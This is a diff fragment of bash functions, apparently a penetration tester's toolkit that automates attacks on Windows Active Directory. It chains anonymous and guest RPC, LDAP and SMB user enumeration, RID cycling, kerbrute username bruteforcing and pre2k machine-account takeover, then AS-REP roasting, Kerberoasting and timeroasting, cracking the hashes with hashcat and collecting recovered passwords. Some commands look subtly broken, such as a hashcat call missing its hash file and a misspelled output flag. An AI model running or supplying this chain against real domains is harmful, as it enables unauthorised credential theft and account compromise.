+    rpcclient -U % -N $1 -c "querydispinfo" 2>/dev/null | tee -a RPC_USERS_DESCRIPTIONS_$1.txt
+    rpcclient -U Guest% -N $1 -c "querydispinfo" 2>/dev/null | tee -a RPC_USERS_DESCRIPTIONS_$1.txt
+
+    rpcclient -U % -N $1 -c "getdompwinfo" 2>/dev/null | tee -a RPC_PASS_POL_$1.txt
+    rpcclient -U Guest% -N $1 -c "getdompwinfo" 2>/dev/null | tee -a RPC_PASS_POL_$1.txt
+
+    rpcclient -U Guest% -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
+    rpcclient -U Guest% -N $1 -c "enumdomusers" 2>/dev/null | awk -F"[][]" '{print $2}' | tee -a RPC_USERS_$1.txt
+
+    rpcclient -U % -N $1 -c "enumprinters" 2>/dev/null | tee -a RPC_PRINTERS_$1.txt
+    rpcclient -U Guest% -N $1 -c "enumprinters" 2>/dev/null | tee -a RPC_PRINTERS_$1.txt
+    if [[ -s RPC_USERS_$1.txt ]]; then
+        cat RPC_USERS_$1.txt | anew -q ../users.txt
+
+        echo -e "\n[+] GETTING QUERYUSER DATA FOR ALL USERS\n"
+        cd RPC_DATA
+        while read user; do
+            rpcclient -U % -N $1 -c "queryuser $user" 2>/dev/null | tee -a RPC_USERS_DATA_$1.txt
+            rpcclient -U Guest% -N $1 -c "queryuser $user" 2>/dev/null | tee -a RPC_USERS_DATA_$1.txt
+        done < ../users.txt
+    fi
+    cd ..
+    find ./RPC_DATA -type f -empty -delete; rmdir ./RPC_DATA 2>/dev/null
+
+    echo -e "\n[+] ATTEMPTING RID CYCLING\n"
+    mkdir -p RID_CYCLE && cd RID_CYCLE
+    dom=$(nxc ldap $1 | tr '(' '\n' | grep -i domain | awk -F":" '{print $2}' | tr -d ')')
+    lookupsid.py $dom/@$1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
+    lookupsid.py $dom/Guest:''@$1 -no-pass 10000 | grep SidTypeUser | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
+
+    protocols=("smb" "mssql")
+    for protocol in "${protocols[@]}"; do
+        nxc $protocol   $1 --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
+        nxc $protocol   $1 -u Guest -p '' --rid-brute 10000 | grep SidTypeUser | awk '{print $6}' | awk -F'\\\\|\\(' '{print $2}' | tee -a RID_USERS_$1.txt
+    done
+    cat RID_USERS_$1.txt | anew -q ../users.txt
+    cd ..
+    find ./RID_CYCLE -type f -empty -delete; rmdir ./RID_CYCLE 2>/dev/null
+
+    echo -e "\n[+] ATTEMPTING LDAP ANONYMOUS DUMPING\n"
+    mkdir -p LDAP_DATA && cd LDAP_DATA
+    nxc ldap $1 -u '' -p '' --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' | tee -a LDAP_USERS_$1.txt
+    nxc ldap $1 -u '' -p '' --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "" | sed -E 's/^LDAP\s+\S+\s+\S+\s+\S+\s+//' | awk '/\\[\\+] Response for object:/ { if (p) print p; p="" } { p = p ? p"\n"$0 : $0 } END { print p }' | grep -v "msDS-SupportedEncryptionTypes\|lastLogonTimestamp\|dSCorePropagationData\|isCriticalSystemObject\|objectCategory\|servicePrincipalName\|sAMAccountType\|logonCount\|accountExpires\|objectSid\|primaryGroupID\|pwdLastSet\|localPolicyFlags\|lastLogon\|lastLogoff\|badPasswordTime\|countryCode\|codePage\|badPwdCount\|userAccountControl\|objectGUID\|name\|uSNChanged\|uSNCreated\|whenChanged\|whenCreated\|instanceType\|distinguishedName\|cn\|objectClass\|dNSHostName\|operatingSystem\|operatingSystemVersion\|logonHours\|displayName\|givenName\|msDFSR-ComputerReferenceBL\|msDS-GenerationId\|rIDSetReferences\|serverReferenceBL\|showInAdvancedViewOnly\|servicePrincipalName" | awk '/\\[\\+] Response for object:/ || NF >= 2' | grep -v ^CN= | sed 's/\[+] Response for object:/\n&/' > LDAP_USER_PROPERTIES_$1.txt
+
+    echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+    nxc ldap $1 -u '' -p '' --query "(objectClass=domainDNS)" "minPwdLength lockoutThreshold" | tee -a LDAP_PASS_POL_$1.txt
+
+    echo -e "\n[+] DOMAIN TRUST DATA\n"
+    nxc ldap $1 -u '' -p '' --dc-list --get-sid
+    cat LDAP_USERS_$1.txt | anew -q ../users.txt
+
+    if [[ ! -s LDAP_USERS_$1.txt ]]; then
+        echo -e "\n[+] ATTEMPTING SMB DUMPING\n"
+        cd .. && mkdir -p SMB_DATA && cd SMB_DATA
+        nxc smb $1 -u '' -p '' --users-export ANON_SMB_USERS_$1.txt
+        nxc smb $1 -u Guest -p '' --users-export GUEST_SMB_USERS_$1.txt
+        cat ANON_SMB_USERS_$1.txt GUEST_SMB_USERS_$1.txt | sort -u | anew -q SMB_USERS_$1.txt && rm ANON_SMB_USERS_$1.txt GUEST_SMB_USERS_$1.txt
+        if [[ -s SMB_USERS_$1.txt ]]; then
+            echo -e "\n[+] FOUND SMB USERS\n"
+            cat SMB_USERS_$1.txt
+            cat SMB_USERS_$1.txt | anew -q ../users.txt
+        fi
+
+        echo -e "\n[+] DOMAIN PASSWORD POLICY\n"
+        nxc smb $1 -u Guest -p '' --pass-pol
+        nxc smb $1 -u '' -p '' --pass-pol
+
+        cd ..
+        find ./SMB_DATA -type f -empty -delete; rmdir ./SMB_DATA 2>/dev/null
+    fi
+
+    echo -e "\n[+] ATTEMPTING USER BRUTEFORCING\n"
+    dom=$(cat /etc/hosts | grep -i $1 | awk '{print $3}' | head -n 1)
+    kerbrute userenum -t 40 -d $dom --dc $1 $2 | grep -i + | awk '{print $7}' | awk -F"@" '{print $1}' | tee -a LDAP_BRUTE_$1.txt
+    cat LDAP_BRUTE_$1.txt | anew -q ../users.txt
+    cd ..
+    find ./LDAP_DATA -type f -empty -delete; rmdir ./LDAP_DATA 2>/dev/null
+
+    echo -e "\n[+] ATTEMPTING PRE2K TAKEOVER\n"
+    mkdir -p PRE2K_TGT && cd PRE2K_TGT
+    cat ../users.txt | grep -i '$$' | anew -q pc_accounts.txt
+    pre2k $1 pc_accounts.txt
+    cd ..
+    find ./PRE2K_TGT -type f -empty -delete; rmdir ./PRE2K_TGT 2>/dev/null
+
+    echo -e "\n[+] SAVING UNIQUE USERS IN \"users.txt\"\n"
+    domroast $1 users.txt
+}
+
+# Full KB Roasting
+domroast(){
+    mkdir -p ROASTING_HASHES && cd ROASTING_HASHES
+    if [[ -z $3 ]]; then
+        mkdir -p ASREP && cd ASREP
+        asreproast $1 $2
+        if [[ -s asrep_cracked.txt ]]; then
+            cat asrep_cracked.txt
+            echo -e "\n[+] SAVING ALL FOUND PASSWORDS IN \"pass.txt\"\n"
+            cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
+            mv asrep_cracked.txt ..
+        fi
+    else
+        mkdir -p ASREP && cd ASREP
+        asreproast $1 $2 $3
+        if [[ -s asrep_cracked.txt ]]; then
+            cat asrep_cracked.txt
+            echo -e "\n[+] SAVING ALL FOUND PASSWORDS IN \"pass.txt\"\n"
+            cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
+            mv asrep_cracked.txt ..
+        fi
+        cd ..
+
+        mkdir -p KBR && cd KBR
+        kbroast $1 $2 $3
+        if [[ -s kb_cracked.txt ]]; then
+            cat kb_cracked.txt
+            echo -e "\n[+] SAVING ALL FOUND PASSWORDS IN \"pass.txt\"\n"
+            cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
+            mv kb_cracked.txt ..
+        fi
+        cd ..
+    fi
+    mkdir -p NTP && cd NTP
+    timeroast $1
+    if [[ -s ntp_cracked.txt ]]; then
+       cat ntp_cracked.txt
+       echo -e "\n[+] SAVING ALL UNIQUE PASSWORDS FOUND IN \"pass.txt\"\n"
+       cat *_cracked.txt | awk -F":" '{print $2}' | anew -q ../../pass.txt
+
+       mv ntp_cracked.txt ..
+    fi
+    cd ../..
+}
+
+
+# Timeroasting Wrapper
+timeroast(){
+    echo -e "\n[+] CRACKING NTP HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
+    nxc smb $1 -M timeroast | grep sntp-ms | awk '{print $5}' | awk -F":" '{print $2}' > NTP_RAW_$1.txt
+    if [[ -s NTP_RAW_$1.txt ]]; then
+        ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin NTP_RAW_$1.txt -m 31300 -a 0 -O -w 4 --quiet /usr/share/wordlists/rockyou.txt --outfile ntp_cracked.txt
+    fi
+}
+
+# KB Roasting wrapper
+kbroast(){
+    echo -e "\n[+] SEARCHING USERS TO KERBEROAST\n"
+    dc_fqdn=$(cat /etc/hosts | grep -i $1 | awk '{print $2}' | head -n 1)
+    if [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+        nxc ldap $1 -u $2 -p $3 --kerberoasting KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ','
+    else
+        nxc ldap $1 -u $2 -H $3 --kerberoasting KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ','
+    fi
+    if [[ -s KB_RAW_$1.txt ]]; then
+        echo -e "\n[+] CRAKING KB HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
+        ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin -m 13100 KB_RAW_$1.txt -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --quiet --outfile kb_cracked.txt
+    fi
+}
+
+asreproast(){
+    echo -e "\n[+] SEARCHING USERS TO ASREPROAST\n"
+    dc_fqdn=$(cat /etc/hosts | grep -i $1 | awk '{print $2}' | head -n 1)
+    if [[ -z $3 ]]; then
+        asrep=$(nxc ldap $1 -u $2 -p '' --asreproast ASREP_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
+    else
+        if [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+            asrep=$(nxc ldap $1 -u $2 -p $3 --asreproast ASREP_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
+        else
+            asrep=$(nxc ldap $1 -u $2 -H $3 --asreproast ASREP_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
+        fi
+    fi
+    echo $asrep
+
+    if [[ -s ASREP_RAW_$1.txt ]]; then
+        echo -e "\n[+] CRAKING ASREP HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
+        ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin -m 18200 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --outfile asrep_cracked.txt
+
+        echo -e "\n[+] SEARCHING BLIND KB ROASTING USERS\n"
+        if [[ -z $3 ]]; then
+            blind_kb=$(nxc ldap $1 -u $(echo $asrep | head -n 1) -p '' --no-preauth-targets $2 --kerberoasting BLIND_KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
+        else
+            if [[ -z $(echo $3 | grep -E '[0-9a-fA-F]{32}') ]]; then
+                nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' > all_users_$1.txt
+            else
+                nxc ldap $1 -u $2 -p $3 --query "(|(sAMAccountType=805306368)(samaccounttype=805306369))" "samaccountname" | grep -i samaccountname | awk '{print $6}' > all_users_$1.txt
+            fi
+            blind_kb=$(nxc ldap $1 -u $(echo $asrep | head -n 1) -p '' --no-preauth-targets all_users_$1.txt --kerberoasting BLIND_KB_RAW_$1.txt -k --kdcHost $dc_fqdn | grep -i samaccountname | awk '{print $7}' | tr -d ',')
+        fi
+        echo $blind_kb
+
+        if [[ -s BLIND_KB_RAW_$1.txt ]]; then
+            echo -e "\n[+] CRACKING BLIND KB HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
+            ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin BLIND_KB_RAW_$1.txt -m 13100 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --oufile blind_kb_cracked.txt
+        fi
+    fi
+}
+
+kbload(){
+    echo -e "\n[+] LOADED TICKET \"$1\"\n"
+    export KRB5CCNAME=$1
+    klist
 }
